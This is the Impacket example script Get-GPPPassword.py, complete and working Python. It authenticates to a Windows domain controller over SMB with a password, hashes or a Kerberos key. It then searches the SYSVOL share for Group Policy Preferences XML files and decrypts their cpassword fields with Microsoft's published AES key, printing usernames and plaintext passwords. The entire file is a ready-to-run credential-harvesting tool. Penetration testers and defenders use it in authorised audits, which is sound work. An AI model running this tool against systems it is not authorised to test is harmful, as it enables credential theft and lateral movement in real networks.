#!/usr/bin/env python3
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Python script for extracting and decrypting Group Policy Preferences passwords,
#   using Impacket's lib, and using streams for carving files instead of mounting shares
#
# Authors:
#   Remi Gascou (@podalirius_)
#   Charlie Bromberg (@_nwodtuhs)
#

import argparse
import base64
import chardet
import logging
import os
import re
import sys
import traceback

from xml.dom import minidom
from io import BytesIO

from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

from impacket import version
from impacket.examples import logger, utils
from impacket.smbconnection import SMBConnection, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB_DIALECT, SessionError


class GetGPPasswords(object):
    """docstring for GetGPPasswords."""

    def __init__(self, smb, share):
        super(GetGPPasswords, self).__init__()
        self.smb = smb
        self.share = share

    def list_shares(self):
        logging.info("Listing shares...")
        resp = self.smb.listShares()
        shares = []
        for k in range(len(resp)):
            shares.append(resp[k]['shi1_netname'][:-1])
            print('  - %s' % resp[k]['shi1_netname'][:-1])
        print()

    def find_cpasswords(self, base_dir, extension='xml'):
        logging.info("Searching *.%s files..." % extension)
        # Breadth-first search algorithm to recursively find .extension files
        files = []
        searchdirs = [base_dir + '/']
        while len(searchdirs) != 0:
            next_dirs = []
            for sdir in searchdirs:
                logging.debug('Searching in %s ' % sdir)
                try:
                    for sharedfile in self.smb.listPath(self.share, sdir + '*', password=None):
                        if sharedfile.get_longname() not in ['.', '..']:
                            if sharedfile.is_directory():
                                logging.debug('Found directory %s/' % sharedfile.get_longname())
                                next_dirs.append(sdir + sharedfile.get_longname() + '/')
                            else:
                                if sharedfile.get_longname().endswith('.' + extension):
                                    logging.debug('Found matching file %s' % (sdir + sharedfile.get_longname()))
                                    results = self.parse(sdir + sharedfile.get_longname())
                                    if len(results) != 0:
                                        self.show(results)
                                        files.append({"filename": sdir + sharedfile.get_longname(), "results": results})
                                else:
                                    logging.debug('Found file %s' % sharedfile.get_longname())
                except SessionError as e:
                    logging.debug(e)
            searchdirs = next_dirs
            logging.debug('Next iteration with %d folders.' % len(next_dirs))
        return files

    def parse_xmlfile_content(self, filename, filecontent):
        results = []
        try:
            root = minidom.parseString(filecontent)
            properties_list = root.getElementsByTagName("Properties")
            # function to get attribute if it exists, returns "" if empty
            read_or_empty = lambda element, attribute: (
                element.getAttribute(attribute) if element.getAttribute(attribute) != None else "")
            for properties in properties_list:
                results.append({
                    'newname': read_or_empty(properties, 'newName'),
                    'changed': read_or_empty(properties.parentNode, 'changed'),
                    'cpassword': read_or_empty(properties, 'cpassword'),
                    'password': self.decrypt_password(read_or_empty(properties, 'cpassword')),
                    'username': read_or_empty(properties, 'userName'),
                    'file': filename
                })
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                traceback.print_exc()
            logging.debug(str(e))
        return results

    def parse(self, filename):
        results = []
        filename = filename.replace('/', '\\')
        fh = BytesIO()
        try:
            # opening the files in streams instead of mounting shares allows for running the script from
            # unprivileged containers
            self.smb.getFile(self.share, filename, fh.write)
        except SessionError as e:
            logging.error(e)
            return results
        except Exception as e:
            raise
        output = fh.getvalue()
        encoding = chardet.detect(output)["encoding"]
        if encoding != None:
            filecontent = output.decode(encoding).rstrip()
            if 'cpassword' in filecontent:
                logging.debug(filecontent)
                results = self.parse_xmlfile_content(filename, filecontent)
                fh.close()
            else:
                logging.debug("No cpassword was found in %s" % filename)
        else:
            logging.debug("Output cannot be correctly decoded, are you sure the text is readable ?")
            fh.close()
        return results

    def decrypt_password(self, pw_enc_b64):
        if len(pw_enc_b64) != 0:
            # thank you MS for publishing the key :) (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)
            key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20' \
                  b'\x9b\x09\xa4\x33\xb6\x6c\x1b'
            # thank you MS for using a fixed IV :)
            iv = b'\x00' * 16
            pad = len(pw_enc_b64) % 4
            if pad == 1:
                pw_enc_b64 = pw_enc_b64[:-1]
            elif pad == 2 or pad == 3:
                pw_enc_b64 += '=' * (4 - pad)
            pw_enc = base64.b64decode(pw_enc_b64)
            ctx = AES.new(key, AES.MODE_CBC, iv)
            pw_dec = unpad(ctx.decrypt(pw_enc), ctx.block_size)
            return pw_dec.decode('utf-16-le')
        else:
            logging.debug("cpassword is empty, cannot decrypt anything")
            return ""

    def show(self, results):
        for result in results:
            logging.info("NewName\t: %s" % result['newname'])
            logging.info("Changed\t: %s" % result['changed'])
            logging.info("Username\t: %s" % result['username'])
            logging.info("Password\t: %s" % result['password'])
            logging.info("File\t: %s \n" % result['file'])


def parse_args():
    parser = argparse.ArgumentParser(add_help=True,
                                     description='Group Policy Preferences passwords finder and decryptor')
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                       ' (if you want to parse local files)')
    parser.add_argument("-xmlfile", type=str, required=False, default=None, help="Group Policy Preferences XML files to parse")
    parser.add_argument("-share", type=str, required=False, default="SYSVOL", help="SMB Share")
    parser.add_argument("-base-dir", type=str, required=False, default="/", help="Directory to search in (Default: /)")
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    return parser.parse_args()


def parse_target(args):
    domain, username, password, address = utils.parse_target(args.target)

    if args.target_ip is None:
        args.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and args.hashes is None and args.no_pass is False and args.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if args.aesKey is not None:
        args.k = True

    if args.hashes is not None:
        lmhash, nthash = args.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    return domain, username, password, address, lmhash, nthash


def init_logger(args):
    # Init the example's logger theme and debug level
    logger.init(args.ts)
    if args.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)


def init_smb_session(args, domain, username, password, address, lmhash, nthash):
    smbClient = SMBConnection(address, args.target_ip, sess_port=int(args.port))
    dialect = smbClient.getDialect()
    if dialect == SMB_DIALECT:
        logging.debug("SMBv1 dialect used")
    elif dialect == SMB2_DIALECT_002:
        logging.debug("SMBv2.0 dialect used")
    elif dialect == SMB2_DIALECT_21:
        logging.debug("SMBv2.1 dialect used")
    else:
        logging.debug("SMBv3.0 dialect used")
    if args.k is True:
        smbClient.kerberosLogin(username, password, domain, lmhash, nthash, args.aesKey, args.dc_ip)
    else:
        smbClient.login(username, password, domain, lmhash, nthash)
    if smbClient.isGuestSession() > 0:
        logging.debug("GUEST Session Granted")
    else:
        logging.debug("USER Session Granted")
    return smbClient


def main():
    print(version.BANNER)
    args = parse_args()
    init_logger(args)
    if args.target.upper() == "LOCAL" :
        if args.xmlfile is not None:
            # Only given decrypt XML file
            if os.path.exists(args.xmlfile):
                g = GetGPPasswords(None, None)
                logging.debug("Opening %s XML file for reading ..." % args.xmlfile)
                f = open(args.xmlfile,'r')
                rawdata = ''.join(f.readlines())
                f.close()
                results = g.parse_xmlfile_content(args.xmlfile, rawdata)
                g.show(results)
            else:
                print('[!] File does not exists or is not readable.')
    else:
        domain, username, password, address, lmhash, nthash = parse_target(args)
        try:
            smbClient= init_smb_session(args, domain, username, password, address, lmhash, nthash)
            g = GetGPPasswords(smbClient, args.share)
            g.list_shares()
            g.find_cpasswords(args.base_dir)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                traceback.print_exc()
            logging.error(str(e))


if __name__ == '__main__':
    main()
